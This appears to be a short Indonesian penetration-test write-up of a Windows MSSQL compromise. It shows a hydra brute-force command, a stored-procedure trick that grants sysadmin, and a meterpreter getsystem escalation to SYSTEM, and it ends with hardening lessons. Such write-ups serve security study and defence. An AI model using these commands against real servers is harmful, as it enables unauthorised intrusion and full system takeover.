Research // WIN-004

MSSQL System Pwn

#mssql-exploitation #sql-privesc #named-pipe-impersonation

Executive Summary

"Audit ini mengungkap kerentanan pada infrastruktur database Windows. Eksploitasi dimulai dari pengumpulan informasi melalui layanan FTP yang terekspos, diikuti dengan serangan brute-force pada MSSQL, hingga eskalasi hak akses sistem tertinggi (NT AUTHORITY\SYSTEM) melalui teknik impersonasi Named Pipe."

01

/ Reconnaissance & Initial Entry

Enumerasi awal pada layanan FTP mengungkap informasi Banner Grabbing yang membocorkan nama pengguna potensial (operator_sql). Menggunakan informasi ini, serangan brute-force dilakukan pada layanan MSSQL (Port 1433).

# Targeted brute force against MSSQL
$ hydra -l operator_sql -P /usr/share/wordlists/rockyou.txt 10.1.2.x mssql
[1433][mssql] host: 10.1.2.x login: operator_sql password: sql_pass123
02

/ SQL Privilege Escalation: Sysadmin Role

Setelah mendapatkan akses ke MSSQL, kami menemukan bahwa akun pengguna memiliki hak terbatas. Namun, melalui manipulasi prosedur tersimpan (Stored Procedures), kami berhasil meningkatkan peran pengguna menjadi sysadmin.

SQL (operator_sql)> CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'operator_sql', 'sysadmin';
SQL (operator_sql)> EXEC sp_elevate_me;
SQL (operator_sql)> SELECT IS_SRVROLEMEMBER('sysadmin');
[+] Result: 1 (Success)
03

/ Execution & System Impersonation

Dengan hak akses sysadmin, kami mengaktifkan xp_cmdshell untuk mendapatkan reverse shell. Eskalasi akhir ke level SYSTEM dilakukan menggunakan teknik Named Pipe Impersonation (PrintSpooler variant).

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation).
# whoami
NT AUTHORITY\SYSTEM

04 LESSONS LEARNED

FTP Hardening

Jangan biarkan banner FTP membocorkan nama pengguna sistem yang valid.

SQL Policy

Nonaktifkan xp_cmdshell dan batasi kemampuan pembuatan prosedur tersimpan.

Service Hardening

Patch sistem Windows untuk mencegah eksploitasi impersonasi pipe yang umum.
